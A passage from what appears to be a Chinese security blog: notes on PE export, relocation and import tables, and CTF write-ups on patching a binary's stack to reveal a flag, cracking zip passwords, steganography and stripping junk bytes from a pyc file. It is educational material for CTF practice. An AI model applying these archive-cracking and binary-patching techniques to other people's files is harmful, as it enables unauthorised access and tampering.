class="headerlink" title="DWORD   NumberOfNames-以名字（有名字的）导出的函数的个数"></a>DWORD   NumberOfNames-以名字（有名字的）导出的函数的个数</h3><p>可以将两个不同的名字指向相同的地址</p><p>有一些是无名函数不会在里面</p><p>后四个</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646622415877.png"></p><p>下面就是子表了，三个子表都是RVA，要转为FOA</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646622483098.png"></p><p>分别是函数地址表0x8228，函数名称表0x8238，函数序号表0x8248</p><blockquote><p>先去找函数名称表，根据名称的下标再去序号表找对应，然后再去函数地址表找</p></blockquote><h4 id="函数地址表-AddressOfFunctions"><a href="#函数地址表-AddressOfFunctions" class="headerlink" title="函数地址表-AddressOfFunctions"></a>函数地址表-AddressOfFunctions</h4><p>函数地址表指向一个偏移，这个偏移存放了所有导出函数的地址，每个地址占四个字节，存放的是RVA地址</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646622927186.png"></p><p>ImageBase+函数偏移就是函数在内存中的实际地址</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646623978690.png"></p><p>可以看到这就是函数</p><p> 还需要注意的就是，如果你按照序号导出1 3 4 5这4个函数，在导入表中我们的函数地址表中的地址会有5个，原因就是：中断的序号会给我们用0填充，２虽然没有，但是也会给我们导出. </p><h4 id="函数名称表-AddressOfNames"><a href="#函数名称表-AddressOfNames" class="headerlink" title="函数名称表-AddressOfNames"></a>函数名称表-AddressOfNames</h4><p>函数名称表也是存储名称的RVA，四个字节存储一个，RVA的个数由以函数名称导出函数个数来决定（DWORD  NumberOfNames）</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646625166524.png"></p><p>转为FOA就是0x805e，0x8071,0x8082,0x8093</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646625255683.png"></p><p>排序的时候是按照字母顺序排列的，而不是按照导出时函数的顺序进行排序的</p><p>例如:</p><p>　　EXPORT</p><p>　　　　SUB</p><p>　　　　ADD</p><p>　　　　MUL</p><p>导出三个函数，那么第一项就为 ADD，因为按照字母排序，A在前边，后面依次类推，所以我们上面看到的函数名称 ACquireSRW 这个函数名称，并不是第一个导出的函数.</p><h4 id="函数序号表-AddressOfNumberOrdinals－存储的是RVA"><a href="#函数序号表-AddressOfNumberOrdinals－存储的是RVA" class="headerlink" title="函数序号表-AddressOfNumberOrdinals－存储的是ＲＶＡ"></a>函数序号表-AddressOfNumberOrdinals－存储的是ＲＶＡ</h4><p>给名称用的中转表</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646625803927.png"></p><p>和函数名称表大小相同</p><h4 id="按名称导出"><a href="#按名称导出" class="headerlink" title="按名称导出"></a>按名称导出</h4><p>得到函数名称后去AddressOfNames中的函数名称对比，得到索引后根据索引取出AddressOfNameOrdinals存储的值，以此为索引去函数地址表找到函数的地址</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1647329750554.png" alt="按名称导出过程"></p><p>函数数量计算方式=最大序号-最小序号+1，（连续的算得准）不连续的话在函数地址表会留有多余的地址，但是多余的地址没有被使用</p><h4 id="按序号导出"><a href="#按序号导出" class="headerlink" title="按序号导出"></a>按序号导出</h4><blockquote><p>当使用序号导出的时候不需要使用序号表，直接将序号-Base作为索引去函数地址表找即可</p></blockquote><h4 id="导出的过程"><a href="#导出的过程" class="headerlink" title="导出的过程"></a>导出的过程</h4><p>系统和我们前面说的不一样</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646724098510.png" alt="1"></p><p>根据函数地址表找，如果索引在序号表中，说明是按名字导出的，再去名称表找对应，索引和序号表中的相同</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646724264502.png"></p><p>这里的100a索引是3，在序号表中没有，所以不是按照序号导出的，序号可算，为索引+Base=005</p><h1 id="重定位表-struct-IMAGE-DATA-DIRECTORY-BaseRelocationTable"><a href="#重定位表-struct-IMAGE-DATA-DIRECTORY-BaseRelocationTable" class="headerlink" title="重定位表-struct IMAGE_DATA_DIRECTORY BaseRelocationTable"></a>重定位表-struct IMAGE_DATA_DIRECTORY BaseRelocationTable</h1><h2 id="程序的加载过程"><a href="#程序的加载过程" class="headerlink" title="程序的加载过程"></a>程序的加载过程</h2><p>系统加载的dll一般在高空间运行，一般是71**************</p><p>先像贴图一样把dll贴在内存中，最后指向exe文件的入口点，exe开始运行</p><p>我们自己写的dll的imageBase都是1000000，所以当多个dll同时使用，会存在地址已经被占用的问题，所以dl只能往后放，但是：</p><p>编译器生成的地址=ImageBase+RVA，这个地址在程序编译完成后，已经写入文件了。但是如果当程序加载时没有按照原来的ImageBase载入，但是此时程序还是会按照前面生成的地址进行使用</p><p>所以一般exe不存在重定位表，而dll一般都有，用于记录需要修改的地方</p><h2 id="重定位表解析"><a href="#重定位表解析" class="headerlink" title="重定位表解析"></a>重定位表解析</h2><p>重定位表是分块，根据RVA计算得到FOA，跳转过去发现有几个重定位表</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646727831045.png"></p><p>这两个数据分别存储RVA和大小</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646727910599.png"></p><p>下面的数据中，每两个字节代表这一段有多少个数据需要修复，一般是绝对地址需要修改</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646728080337.png"></p><p>只需要基础地址加上小表的值就可以定位到需要修改的地方，而不用四个字节来存储地址，节省了空间，而这个基础地址就是前面记录的RVA</p><p>而基础地址可以不同，所以才需要分块操作</p><p>可以发现每一块的间隔是1000h，也就是内存对齐的大小</p><p>一个页是1000h，所以只需要1000个十六进制的地址就可以记录完一页的每个位置，对应十进制的4096个</p><p>2^12=4096，所以只需要十二个二进制位就可以表示完所有可能，两个字节有十六位，所以最后找地址的时候，只用取低十二位，高四位有别的用处-如果高四位的值是3就说明这个地方需要修改</p><h3 id="判断块数"><a href="#判断块数" class="headerlink" title="判断块数"></a>判断块数</h3><p>下一块的开始地址都可以通过RVA+SizeOfBlock来得到</p><p>直到遇到全为零的块</p><p>计算需要修改的数据个数：(SizeOfBlock-8)/2，因为前面两个数据是8个字节，剩下的两个字节为1组</p><h1 id="移动导出表-重定位表"><a href="#移动导出表-重定位表" class="headerlink" title="移动导出表-重定位表"></a>移动导出表-重定位表</h1><p>表的数据也在节区中，加密代码时，表的信息也会被加密，这样程序无法初始化，所以要先增节，再移动表，学会移动各种表是对程序加密和破解的基础</p><h2 id="移动导出表"><a href="#移动导出表" class="headerlink" title="移动导出表"></a>移动导出表</h2><p>比较繁琐，因为要移动多张表</p><h3 id="在DLL文件中新增节"><a href="#在DLL文件中新增节" class="headerlink" title="在DLL文件中新增节"></a>在DLL文件中新增节</h3><p>先计算大小</p><p>并且返回新增节的FOA，因为后面的数据还要从新增节的开头开始</p><h3 id="复制数据"><a href="#复制数据" class="headerlink" title="复制数据"></a>复制数据</h3><p>需要复制的数据类型和长度</p><h4 id="复制AddressOfFunctions"><a href="#复制AddressOfFunctions" class="headerlink" title="复制AddressOfFunctions"></a>复制AddressOfFunctions</h4><p>长度：4×NumberOfFunctions</p><h4 id="复制AddressOfNameOrdinals"><a href="#复制AddressOfNameOrdinals" class="headerlink" title="复制AddressOfNameOrdinals"></a>复制AddressOfNameOrdinals</h4><p>长度：2×NumberOfNames</p><h4 id="复制AddressOfNames"><a href="#复制AddressOfNames" class="headerlink" title="复制AddressOfNames"></a>复制AddressOfNames</h4><p>长度：4×NumberOfNames</p><h4 id="复制所有函数名"><a href="#复制所有函数名" class="headerlink" title="复制所有函数名"></a>复制所有函数名</h4><p>长度不确定，复制时直接修复AddressOfName（因为名字的地址也改变了），每复制完一个名字，都需要计算下一个复制的地方</p><h4 id="复制导出表的整体结构"><a href="#复制导出表的整体结构" class="headerlink" title="复制导出表的整体结构"></a>复制导出表的整体结构</h4><h3 id="修复地址"><a href="#修复地址" class="headerlink" title="修复地址"></a>修复地址</h3><p>AddressOfName</p><p>目录项指向新的导出表的位置</p><p>函数地址表、序号表、名称表都需要修复</p><h3 id="将目录项中的RVA修正"><a href="#将目录项中的RVA修正" class="headerlink" title="将目录项中的RVA修正"></a>将目录项中的RVA修正</h3><p>指向我们新的导出表的位置</p><h2 id="移动重定位表"><a href="#移动重定位表" class="headerlink" title="移动重定位表"></a>移动重定位表</h2><p>直接复制过去，修改RVA即可</p><p>加载程序：（当前面已经有DLL被加载）</p><p>1、将新的DLL复制到新的位置</p><p>2、修复重定位表，修改每一个重定位表的偏移</p><h1 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h1><p>作用：从其他第三方程序导入API，以供本程序调用</p><p>在exe运行的时候加载器会遍历导入表，将导入表中所有dll加载到进程中，被加载的DLL的DLLMain就会被调用</p><p>通过导入表可以知道程序使用了哪些函数</p><p> 导入表，是为了提供的要导入的dll的函数的地址，只不过由于dll地址不固定，所以每次都会重新修正 </p><h2 id="导入表解析"><a href="#导入表解析" class="headerlink" title="导入表解析"></a>导入表解析</h2><h3 id="重要字段"><a href="#重要字段" class="headerlink" title="重要字段"></a>重要字段</h3><pre class="language-c" data-language="c"><code class="language-c">DWORD OriginalFirstThunk;</code></pre><p>指向导入名称表（INT）的RVA</p><pre class="language-c" data-language="c"><code class="language-c">DWORD   FirstThunk;</code></pre><p>指向导入地址表（IAT）的RVA</p><pre class="language-c" data-language="c"><code class="language-c">DWORD   Name;</code></pre><p>指向导入映像文件的名字</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646788456499.png"></p><p>计算后跳转过去，注意要算的是FOA，但是这里RVA和FOA一样 </p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646788490238.png"></p><p>其中IAT与INT都指向 IMAGE_THUNK_DATA32（虽然二者的地址不同）</p><p>INT-以全0结尾</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646788999608.png">          函数名数组(对应IMAGE_THUNK_DATA32结构体数组,每一个结构体就是一个联合体-4字节) </p><pre class="language-c" data-language="c"><code class="language-c">typedef struct  _IMAGE_THUNK_DATA32{union{//联合体，实际是4字节DWORD ForwarderString;DWORD Function;//导入函数的地址,在加载到内存之后,这里才起作用DWORD Ordinal;//假如是序号导入的,会用到这里DWORD AddressOfData;//假如是函数名导入,会用到这里,它指向另外一个结构体PIMAGE_IMPORT_BY_NAME}u1;}IMAGE_THUNK_DATA32;//如果是函数名导入的,AddressOfData会指向下面这个结构体typedef struct _IMAGE_IMPORT_BY_NAME{WORD  Hint;//序号CHAR Name[1];//不定长,字符串}</code></pre><h2 id="导入表结构"><a href="#导入表结构" class="headerlink" title="导入表结构"></a>导入表结构</h2><p>在可选PE头最后的十六个数组的导入表结构，这里存放的是RVA</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646998855451.png"></p><p>跳转过去发现存储的是struct IMAGE_IMPORT_DESCRIPTOR ImportDescriptor[0]，这里存放的是真正的导入表结构</p><p>有多少个DLL，对应的结构体数组就有几个</p><p>关键的数据有下面三个，也要注意这里的TimeDateStamp-时间戳</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646999149540.png"></p><h3 id="INT表"><a href="#INT表" class="headerlink" title="INT表"></a>INT表</h3><p><em><strong>ULONG OriginalFirstThunk-RVA</strong></em>，存放的是IMAGE_THUNK_DATA这个结构体数组，四字节数，以0结尾</p><p>跳转过去</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646999423139.png"></p><p> 但是之前学导出表有了解到，导出函数可以以名字导出，亦可以序号导出。所以为了方便区分，就将这INT表的每个值做了细微调整。</p><blockquote><p> 如果这个4字节数的最高位（二进制）为1，那么抹去这个最高位之后，所表示的数就是要导入的函数的序号；如果最高位是0，那这个数就也是一个RVA，指向IMAGE_IMPORT_BY_NAME结构体（包含真正的导入函数的名字字符串，以0结尾）。INT表以4字节0结尾。 </p></blockquote><p>根据INT存储的RVA进行跳转</p><h4 id="struct-IMAGE-IMPORT-BY-NAME"><a href="#struct-IMAGE-IMPORT-BY-NAME" class="headerlink" title="struct _IMAGE_IMPORT_BY_NAME"></a>struct _IMAGE_IMPORT_BY_NAME</h4><p>1、WORD Hint，可能为0，编译器决定，如果不为0，则是函数在导出表中的索引</p><p>2、BYTE Name[1]，函数名称，以0结尾</p><h3 id="NAME"><a href="#NAME" class="headerlink" title="NAME"></a>NAME</h3><p>DLL的名字，以0结尾</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1646999638790.png"></p><h3 id="ULONG-FirstThunk"><a href="#ULONG-FirstThunk" class="headerlink" title="ULONG FirstThunk"></a>ULONG FirstThunk</h3><p>根据RVA跳转，发现存储的值和INT的一样，这个存储的是IAT，当文件加载后，会发现IAT会改变</p><h4 id="IAT表-导入地址表"><a href="#IAT表-导入地址表" class="headerlink" title="IAT表-导入地址表"></a>IAT表-导入地址表</h4><p> 记录程序正在使用哪些库中的哪些函数 </p><p>分为两个过程，在文件中存储的是存放函数的地址，在内存中存放函数</p><p>在文件运行前类似于call [地址]</p><p>在文件运行时类似于call [上面地址存放的值，也就是函数]</p><h4 id="IAT表存在的原因"><a href="#IAT表存在的原因" class="headerlink" title="IAT表存在的原因"></a>IAT表存在的原因</h4><p> 一般程序在调用自身函数的时候，自身函数地址RVA是固定的；但是当程序在调用dll里的函数的时候，由于dll的地址会发生重定位，导致dll里的函数地址每次都会发生变化。 </p><p>为了准确调用dll函数的地址，构造了IAT表来存储程序运行时，即DLL文件重定位之后的dll函数的位置。</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1649497133114.png"></p><h2 id="导入表加载过程"><a href="#导入表加载过程" class="headerlink" title="导入表加载过程"></a>导入表加载过程</h2><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/aHR0cHM6Ly9naXRlZS5jb20vY2h0MS9JbWFnZS9yYXcvbWFzdGVyL2ltZy8yMDIwMDcxNDAzMjg0Ni5wbmc-1647000237348.png" alt="PE文件加载前"></p><p>加载过程</p><p>先找DLL，再确定使用的函数</p><h3 id="寻找DLL"><a href="#寻找DLL" class="headerlink" title="寻找DLL"></a>寻找DLL</h3><p>先根据导入表的NAME找到DLL名称和DLL的INT和IAT表，开始的时候INT和IAT数据相同，但是存储位置不同，INT和IAT表都指向IMAGE_THUNK_DATA</p><h3 id="查INT表"><a href="#查INT表" class="headerlink" title="查ＩＮＴ表"></a>查ＩＮＴ表</h3><p>因为导出的时候可以按序号导出也可以按函数名称导出，所以为了区分，ｉｍａｇｅ＿ｔｈｕｎｋ＿ｄａｔａ最高位为１时，表示其存储的是序号，而剩下的３１位表示序号，否则ｉｍａｇｅ＿ｔｈｕｎｋ＿ｄａｔａ存储的是IMAGE_BY_NAME的ＲＶＡ</p><p>因为GetProc可以通过序号找到函数地址，也可以使用名称找到，所以通过这种方式找到函数的地址，然后填充至IAT中</p><h3 id="修改IAT"><a href="#修改IAT" class="headerlink" title="修改ＩＡＴ"></a>修改ＩＡＴ</h3><p>使用ＧＥＴＰｒｏＡｄｄｒ（ｍｏｄｕｌｅ）</p><p>将前面查找到的函数地址填充进ＩＡＴ表中</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/aHR0cHM6Ly9naXRlZS5jb20vY2h0MS9JbWFnZS9yYXcvbWFzdGVyL2ltZy8yMDIwMDcxNDAyNTEwMy5wbmc.png" alt="PE文件加载后"> </p><p>可以看到IAT表变成了函数的地址</p><p> IAT表会存储dll的函数的地址，方便调用该函数时，直接取IAT表这个地址内的值，作为函数地址，去CALL。</p><h1 id="绑定导入表-struct-IMAGE-BOUND-IMPORT-DESCRIPTOR"><a href="#绑定导入表-struct-IMAGE-BOUND-IMPORT-DESCRIPTOR" class="headerlink" title="绑定导入表- struct _IMAGE_BOUND_IMPORT_DESCRIPTOR"></a>绑定导入表- struct _IMAGE_BOUND_IMPORT_DESCRIPTOR</h1><p>可选NT头里的结构</p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1647001593786.png"></p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p> 有些windows程序，如notepad，为了提高加载速度，会直接把DLL中的函数地址写入到IAT表，省去了加载时的计算。 </p><h2 id="可能存在的问题"><a href="#可能存在的问题" class="headerlink" title="可能存在的问题"></a>可能存在的问题</h2><p> 第一，当DLL没有占住ImageBase时，IAT中的地址就是错的；第二，当链接的DLL被修改了，那IAT里写的地址也是错的。遇到这两种情形之一，加载时就必须修复IAT了。 </p><p>对于第二种情形，DLL是否被修改，是根据比较DLL的时间戳和绑定导入表中的记录的DLL时间戳来判断的，如果不一致，说明DLL被修改了。</p><p>加载程序时，操作系统根据导入表中的时间戳来判断程序是否使用了绑定导入。当时间戳为0，表示不使用绑定导入表；当时间戳为0xFFFFFFFF，说明该程序使用绑定导入。</p><h2 id="绑定导入表结构"><a href="#绑定导入表结构" class="headerlink" title="绑定导入表结构"></a>绑定导入表结构</h2><pre class="language-c" data-language="c"><code class="language-c">typedef struct _IMAGE_BOUND_IMPORT_DESCRIPTOR {    DWORD   TimeDateStamp;    WORD    OffsetModuleName;    WORD    NumberOfModuleForwarderRefs;// Array of zero or more IMAGE_BOUND_FORWARDER_REF follows} IMAGE_BOUND_IMPORT_DESCRIPTOR,  *PIMAGE_BOUND_IMPORT_DESCRIPTOR;</code></pre><p> TimeDateStamp 是时间戳，用于和DLL中的时间戳比较，判断DLL是否已经发生变化； </p><p> OffsetModuleName 是当前模块名距离第一个 _IMAGE_BOUND_IMPORT_DESCRIPTOR 的偏移。</p><p>  NumberOfModuleForwarderRefs 是该模块依赖的模块数量； </p><h3 id="依赖模块结构"><a href="#依赖模块结构" class="headerlink" title="依赖模块结构"></a>依赖模块结构</h3><pre class="language-c" data-language="c"><code class="language-c">typedef struct _IMAGE_BOUND_FORWARDER_REF {    DWORD   TimeDateStamp;    WORD    OffsetModuleName;    WORD    Reserved;} IMAGE_BOUND_FORWARDER_REF,*PIMAGE_BOUND_FORWARDER_REF;</code></pre><p> 除了第三个属性保留，其他与 _IMAGE_BOUND_IMPORT_DESCRIPTOR 相同。 </p><p><img src="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1647049008006.png" alt="绑定导入表"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2022-WOW-patch数据段</title>
      <link href="/2022/02/22/hgame2022-WOW-patch%E6%95%B0%E6%8D%AE%E6%AE%B5/"/>
      <url>/2022/02/22/hgame2022-WOW-patch%E6%95%B0%E6%8D%AE%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="/2022/02/22/hgame2022-WOW-patch%E6%95%B0%E6%8D%AE%E6%AE%B5/1645531507324.png"></p><p>可以看到上面这一段是输入并且把加密后的输入赋值给Buf2，在这之后已经结束了判断，所以下面红色框的代码应该是解密代码，只需要把Buf在栈中进行修改为final字符串即可</p><p><img src="/2022/02/22/hgame2022-WOW-patch%E6%95%B0%E6%8D%AE%E6%AE%B5/1645531624170.png"></p><p>这里点过去发现并没有数据，这可能是一些数据没有反编译出来，但是在图中蓝色部分可以看到地址是ebp-54</p><p><img src="/2022/02/22/hgame2022-WOW-patch%E6%95%B0%E6%8D%AE%E6%AE%B5/1645531725452.png">计算一下，在堆栈窗口按g进行跳转</p><p><img src="/2022/02/22/hgame2022-WOW-patch%E6%95%B0%E6%8D%AE%E6%AE%B5/1645531744867.png"></p><p>跳转之后</p><p><img src="/2022/02/22/hgame2022-WOW-patch%E6%95%B0%E6%8D%AE%E6%AE%B5/1645531761124.png"></p><p>然后右键Edit，或者按快捷键F2，然后进行修改，注意大小端序的问题，这里使用lazyida选择DWORD导出来就很方便，再次右键，应用修改</p><p>然后运行即可，就可以在input看到flag了</p><p><img src="/2022/02/22/hgame2022-WOW-patch%E6%95%B0%E6%8D%AE%E6%AE%B5/1645531871154.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame-misc</title>
      <link href="/2022/02/19/hgame-misc/"/>
      <url>/2022/02/19/hgame-misc/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>总算是结束了，下面就记录一下misc遇到的一些题目</p><h1 id="这个压缩包有点麻烦"><a href="#这个压缩包有点麻烦" class="headerlink" title="这个压缩包有点麻烦"></a>这个压缩包有点麻烦</h1><h2 id="相关知识-压缩包"><a href="#相关知识-压缩包" class="headerlink" title="相关知识-压缩包"></a>相关知识-压缩包</h2><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p><img src="/2022/02/19/hgame-misc/1645212044252.png"></p><p>可以看到在zip给出了密码的提示，六位纯数字，Advanced Archive Password Recovery爆破</p><p><img src="/2022/02/19/hgame-misc/1645212152522.png"></p><p><img src="/2022/02/19/hgame-misc/1645212207157.png"></p><p>根据提示，给出的应该是字典，我们同样在爆破软件中选择字典</p><p><img src="/2022/02/19/hgame-misc/1645212320305.png"></p><p>继续下一步</p><p><img src="/2022/02/19/hgame-misc/1645212429206.png"></p><p>他让我们重新储存，把readme文件选择以存储的方式压缩发现</p><p><img src="/2022/02/19/hgame-misc/1645212573216.png"></p><p>这两个的CRC32的值是一样的，但是我们知道CRC32的值只有一个，所以使用明文攻击，这里4.5没跑出来，4.0跑出来了</p><p>在jpg文件尾部发现了zip，另存一下，是伪加密</p><p><img src="/2022/02/19/hgame-misc/1645213950846.png"></p><p>修复后得到flag</p><p><img src="/2022/02/19/hgame-misc/1645214098403.png"></p><h1 id="你上当了-我的很大"><a href="#你上当了-我的很大" class="headerlink" title="你上当了 我的很大"></a>你上当了 我的很大</h1><h2 id="相关知识-二维码"><a href="#相关知识-二维码" class="headerlink" title="相关知识-二维码"></a>相关知识-二维码</h2><h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><p>解压之后得到很多的视频，但都是重复的，有用的就几个，主要记录一下各种二维码的样子，以免之后认不出来</p><p><a href="https://barcode.tec-it.com/zh/CodablockF">https://barcode.tec-it.com/zh/CodablockF</a></p><p>这个网站可以生成不同的二维码，便于识别</p><p><a href="https://products.aspose.app/barcode/recognize#">https://products.aspose.app/barcode/recognize#</a></p><p>这个网站识别比较全</p><p><img src="/2022/02/19/hgame-misc/1645213399267.png"></p><p><img src="/2022/02/19/hgame-misc/1645213453036.png"></p><p><img src="/2022/02/19/hgame-misc/1645213467874.png"></p><h1 id="谁不喜欢猫猫呢"><a href="#谁不喜欢猫猫呢" class="headerlink" title="谁不喜欢猫猫呢"></a>谁不喜欢猫猫呢</h1><p><a href="https://blog.csdn.net/mochu7777777/article/details/122631962-%E5%8F%AF%E4%BB%A5%E7%9C%8B%E7%9C%8B%EF%BC%8C%E8%84%9A%E6%9C%AC%E4%B8%8D%E4%BC%9A%E5%86%99">https://blog.csdn.net/mochu7777777/article/details/122631962-可以看看，脚本不会写</a></p><h1 id="摆烂"><a href="#摆烂" class="headerlink" title="摆烂"></a>摆烂</h1><h2 id="相关知识-盲水印、APng、零宽隐写"><a href="#相关知识-盲水印、APng、零宽隐写" class="headerlink" title="相关知识-盲水印、APng、零宽隐写"></a>相关知识-盲水印、APng、零宽隐写</h2><h2 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h2><p>foremost分离压缩包得到png文件，也可以复制文件信息之后另存为，将png拖进010发现奇怪的地方</p><p><img src="/2022/02/19/hgame-misc/1645214249445.png"></p><p>正常的png文件是没有fdAT数据段的 APng-<a href="https://www.jianshu.com/p/5333bcc20ba7">https://www.jianshu.com/p/5333bcc20ba7</a></p><p>查阅资料发现是Apng，这里介绍一个分解Apng的网址</p><p><a href="https://ezgif.com/split">https://ezgif.com/split</a></p><p>得到两张一模一样的图片，这时候就想到了盲水印</p><p><img src="/2022/02/19/hgame-misc/1645214469303.png"></p><p>得到带有密码的图片</p><p><img src="/2022/02/19/hgame-misc/1645214585213.png"></p><p>得到密钥解压压缩包，拼接二维码，扫码得到</p><p><img src="/2022/02/19/hgame-misc/1645214612749.png"></p><p>发现很多问号，应该就是零宽了，这里我手机扫码后的信息再拿去解密-<a href="https://330k.github.io/misc_tools/unicode_steganography.html">https://330k.github.io/misc_tools/unicode_steganography.html</a></p><p><img src="/2022/02/19/hgame-misc/1645214720413.png"></p><h1 id="At0m的给你们的-迟到的-情人节礼物"><a href="#At0m的给你们的-迟到的-情人节礼物" class="headerlink" title="At0m的给你们的(迟到的)情人节礼物"></a>At0m的给你们的(迟到的)情人节礼物</h1><h2 id="相关知识-avi隐写、NTFS数据流、-MSU-StegoVideo工具"><a href="#相关知识-avi隐写、NTFS数据流、-MSU-StegoVideo工具" class="headerlink" title="相关知识-avi隐写、NTFS数据流、 MSU StegoVideo工具"></a>相关知识-avi隐写、NTFS数据流、 MSU StegoVideo工具</h2><h2 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h2><p>一般数据流隐写都采取winrar，所以要关注rar文件</p><p>这里解压之后时候NTFS工具得到</p><p><img src="/2022/02/19/hgame-misc/1645214827597.png"></p><p>四个方向对应四进制，解码的到 6557225 </p><p>还有一个avi文件，一般是MSU StegoVideo工具</p><p>下载好之后选择好avi文件，并且指定写入的文本 ，输入密码即可</p><p>hgame{Q1ng_R3n_J1e_Da_Sh4_CTF}                        </p>]]></content>
      
      
      
        <tags>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pyc加花指令</title>
      <link href="/2022/02/14/pyc%E5%8A%A0%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
      <url>/2022/02/14/pyc%E5%8A%A0%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="VNCTF2022-BabyMaze"><a href="#VNCTF2022-BabyMaze" class="headerlink" title="VNCTF2022-BabyMaze"></a>VNCTF2022-BabyMaze</h1><p>pyc相关知识-<a href="https://zhuanlan.zhihu.com/p/145811103">https://zhuanlan.zhihu.com/p/145811103</a></p><p>使用uncompyle6发现无法反编译，应该是添加了花指令</p><p>先查看字节码</p><p>脚本</p><pre class="language-python" data-language="python"><code class="language-python">import marshal, disf = open("D:\\new\\AD\\game\\vnctf2022\\re\\BabyMaze.pyc", "rb").read()code = marshal.loads(f[16:]) #这边从16位开始取因为是python3 python2从8位开始取dis.dis(code)</code></pre><p><img src="/2022/02/14/pyc%E5%8A%A0%E8%8A%B1%E6%8C%87%E4%BB%A4/1644848858641.png"></p><p>发现这一段就是花指令</p><p>去python的包里面搜索opcode.h，找到对应的字节码</p><p><img src="/2022/02/14/pyc%E5%8A%A0%E8%8A%B1%E6%8C%87%E4%BB%A4/1644848986760.png"></p><p>转为十六进制后去010editor修改，去掉即可</p><p><img src="/2022/02/14/pyc%E5%8A%A0%E8%8A%B1%E6%8C%87%E4%BB%A4/1644849226023.png"></p><p>但是发现还是不行，这是因为</p><p><img src="/2022/02/14/pyc%E5%8A%A0%E8%8A%B1%E6%8C%87%E4%BB%A4/1644849421077.png"></p><p>pyc文件有co_code，所以修改长度之后要修改它</p><p>先打印出来长度，然后计算后修改</p><p><img src="/2022/02/14/pyc%E5%8A%A0%E8%8A%B1%E6%8C%87%E4%BB%A4/1644849766935.png"></p><p>2030-6=7E8</p><p><img src="/2022/02/14/pyc%E5%8A%A0%E8%8A%B1%E6%8C%87%E4%BB%A4/1644849849453.png"></p><p>重新uncompyle6</p><p><img src="/2022/02/14/pyc%E5%8A%A0%E8%8A%B1%E6%8C%87%E4%BB%A4/1644849958666.png"></p><p>反编译成功，接下来就是maze图，打印出来之后手打</p><h1 id="Pyc字节码阅读-unctf2021-pytrade"><a href="#Pyc字节码阅读-unctf2021-pytrade" class="headerlink" title="Pyc字节码阅读-unctf2021-pytrade"></a>Pyc字节码阅读-unctf2021-pytrade</h1><p>得到两个txt文件，一个是py的字节码，一个是输出</p><p>对字节码进行分析</p><p><a href="https://www.jianshu.com/p/557cfe36f0f0">https://www.jianshu.com/p/557cfe36f0f0</a></p><p><a href="https://bbs.pediy.com/thread-246683.htm">https://bbs.pediy.com/thread-246683.htm</a></p><p><a href="https://docs.python.org/zh-cn/3/library/dis.html">https://docs.python.org/zh-cn/3/library/dis.html</a>  这是python3的</p><pre class="language-python" data-language="python"><code class="language-python">0 LOAD_CONST               1 ('XXXXXX')       //This is flag,try to figure it out ! Don't forget to fill it in flag{} !             2 STORE_FAST               0 (flag)</code></pre><p>LOAD_CONST加载const变量，比如数值、字符串等，一般用于传给函数参数</p><p>STORE_FAST 一般用于保存值到局部变量</p><p>这句话意思是</p><pre class="language-none"><code 